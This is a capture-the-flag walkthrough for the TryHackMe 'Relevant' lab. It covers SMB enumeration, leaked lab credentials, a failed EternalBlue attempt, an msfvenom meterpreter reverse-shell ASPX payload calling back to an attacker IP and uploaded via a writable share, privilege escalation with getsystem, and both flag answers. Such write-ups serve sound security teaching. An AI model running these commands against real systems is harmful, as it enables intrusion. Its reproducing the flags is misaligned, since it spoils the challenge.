
# Relevant CTF Walkthrough

Relevant is a vulnerable server on TryHackMe.com<br />
<br />
<i>URL: https://tryhackme.com/room/Relevant<br />
THM Difficulty: Medium<br />
My Difficulty: Easy<br />
Target IP: 10.10.39.76<br />
AttackBox IP: 10.10.153.77<br />
</i>

# Enumeration

For our first command we will use rustscan, rustscan will scan all of the ports in around 3 seconds.<br />
```shell
rustscan -a 10.10.39.76
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT1.png?raw=true)<br />
Now we know which ports are open, I run an Nmap scan with the flag -sV to find the service versions on the open ports.<br />
```shell
nmap -sV -sC -p80,135,139,445,3389,5985,49663,49667,49669 10.10.39.76
```
```shell
Starting Nmap 7.60 ( https://nmap.org ) at 2023-03-08 18:21 GMT
Nmap scan report for ip-10-10-39-76.eu-west-1.compute.internal (10.10.39.76)
Host is up (0.0054s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2023-03-07T18:16:50
|_Not valid after:  2023-09-06T18:16:50
|_ssl-date: 2023-03-08T18:21:59+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:A8:11:CA:08:F3 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: RELEVANT, NetBIOS user: <unknown>, NetBIOS MAC: 02:a8:11:ca:08:f3 (unknown)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-03-08T10:21:59-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-08 18:21:59
|_  start_date: 2023-03-08 18:17:08

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.63 seconds
```
We have found a few open ports with different services, let's try to find some vulnerabilities!

## SMB Service Enumeration

### Nmap SMB-enum scripts

Firstly we'll try using the SMB-enum scripts on Nmap<br />
```shell
nmap -p 139,445 -Pn -script smb-enum* 10.10.39.76
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT7.png?raw=true)<br />
Interesting, we have read/write access on this share... We'll try to use that to exploit the service if we can't find anything else.<br />

### Nmap SMB-vuln scripts

Let's do the same thing but with the SMB vuln scripts to see if there are any vulnerabilities.<br />
```shell
nmap -p 139,445 -Pn -script smb-vuln* 10.10.39.76
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT6.png?raw=true)<br />
Bingo! It looks like the SMB server is vulnerable to MS17-010. We'll enumerate more then exploit this!<br />

### Listing SMB shares

Let's have a look at the SMB service, we'll try to list the shares on the system to see if we can access anything.<br />
```shell
smbclient -L 10.10.39.76
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT2.png?raw=true)<br />

### Listing files on SMB shares

We were able to list the shares without entering a password and it looks like we have access to the share "nt4wrksv". Let's try connecting to the share now and listing the contents.<br />
```shell
smbclient \\\\10.10.39.76\\nt4wrksv
ls
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT3.png?raw=true)<br />
Ooh a file named ```passwords.txt``` let's download the file and have a look inside...
```shell
get passwords.txt
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT4.png?raw=true)<br />
Inside we see two passwords that have been encoded... Looks like Base64 to me, let's try decoding them!<br />

Awesome! We have two accounts now.<br />

#Exploitation


## MS17-010 Remote Code Execution

We're going to use Metasploit to exploit the vulnerability, let's fire it up.<br />
```shell
msfconsole
```
Once we have Metasploit open we're going to select the module to use and then set the required options.<br />
```shell
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.39.76
set SMBUser Bill
set SMBPass Juw4nnaM4n420696969!$$$
exploit
```
... Damn that didn't work... Nevermind let's try something else!<br />

## Exploiting SMB Permissions

Earlier when we performed our Nmap scan with default scripts enabled, we saw that we had read/write permissions on the nt4wrksv share. Let's create a reverse shell with msfvenom.<br />
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.153.77 LPORT=4444 -f aspx > shell.aspx
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT8.png?raw=true)<br />
Now let's upload it to the SMB share.
```shell
smbclient \\\\10.10.39.76\\nt4wrksv
put shell.aspx
```
Before getting the shell to run, we'll need to start our meterpreter reverse_tcp listener! Let's load up Metasploit to do this.<br />
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.153.77
set LPORT 4444
exploit
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT9.png?raw=true)<br />
Now we have our listener, let's run the shell. We head over to our web browser and execute the shell.<br />
```shell
http://10.10.39.76:49663/nt4wrksv/shell.aspx
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT10.png?raw=true)<br />
Success! Now we have our reverse meterpreter shell. (The target box crashed so I had to restart it, it's a new IP if you didn't notice.)<br />

# Escalating Privileges

Let's check what user we're on and then spawn a shell and check our privileges.<br />
```shell
getuid
shell
whoami /priv
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT11.png?raw=true)<br />
Interesting... SeImpersonatePrivilege is enabled. We can use meterpreter to automatically elevate our privileges.<br />

Let's close our shell with Ctrl+C and use meterpreter to execute the following<br />
```shell
getsystem
getuid
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT12.png?raw=true)<br />
Awesome! We have successfully elevated our privileges. Let's get the root flag and complete the box.<br />
```shell
cd C:/Users/Administrator/Desktop
cat root.txt
```
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT13.png?raw=true)<br />


## Questions & Answers

Question 1:<br />
**What is the user flag?** THM{fdk4ka34vk346ksxfr21tg789ktf45}<br />

Question 2:<br />
**What is the root flag?** THM{1fk5kf469devly1gl320zafgl345pv}<br />

### Farewell, I hope you all enjoyed this write-up!

